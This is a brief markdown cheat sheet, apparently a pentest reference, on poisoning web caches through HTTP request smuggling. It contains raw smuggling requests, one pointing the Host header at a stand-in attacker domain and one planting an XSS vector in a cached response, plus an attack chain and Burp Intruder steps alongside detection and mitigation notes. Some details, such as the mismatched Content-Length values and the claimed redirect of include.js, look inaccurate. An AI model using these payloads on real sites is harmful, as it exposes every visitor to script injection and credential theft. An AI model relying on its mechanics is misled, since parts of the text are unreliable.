# Web Cache Poisoning via Request Smuggling

## Attack Overview

HTTP Request Smuggling can be used to poison web caches (CDN, reverse proxy) with malicious content that will be served to all users.

## Basic Cache Poisoning

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 120
Transfer-Encoding: chunked

0

GET /static/include.js HTTP/1.1
Host: evil-attacker.com
X-Cache-Poisoning: true

```

This poisons the cache so that `/static/include.js` is fetched from `evil-attacker.com` instead.

## XSS via Cache Poisoning

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

88
GET / HTTP/1.1
Host: vulnerable-website.com
X-Cache-Key: <svg/onload=alert(1)>

0

```

The XSS payload gets cached and served to all users visiting the site.

## Real-World Attack Chain

1. **Identify cacheable resources**: `/static/`, `/assets/`, `/cdn/`
2. **Craft smuggling payload** to redirect cache to attacker-controlled server
3. **Trigger cache update** by making the poisoned request
4. **All users receive malicious content** from cache

## Detection

Monitor for:
- Unexpected `Host` headers in logs
- Requests to external domains in internal logs
- Cache hits with unusual `X-Forwarded-Host` values

## Impact

- ✗ **Persistent XSS** affecting all users
- ✗ **Credential theft** via malicious JavaScript
- ✗ **Malware distribution** through poisoned resources
- ✗ **Defacement** of cached pages

## Mitigation

```
1. Disable caching for dynamic content
2. Normalize all requests before caching
3. Validate Host headers strictly
4. Use cache keys that include request method
5. Implement cache segmentation
```

## Testing with Burp Suite

1. Identify cacheable endpoints (look for `Cache-Control`, `X-Cache` headers)
2. Use `Cache-Poisoning-Payloads.txt` in Intruder
3. Check responses for `X-Cache: HIT` indicating successful poisoning
4. Verify by making a normal request - you should receive the poisoned response
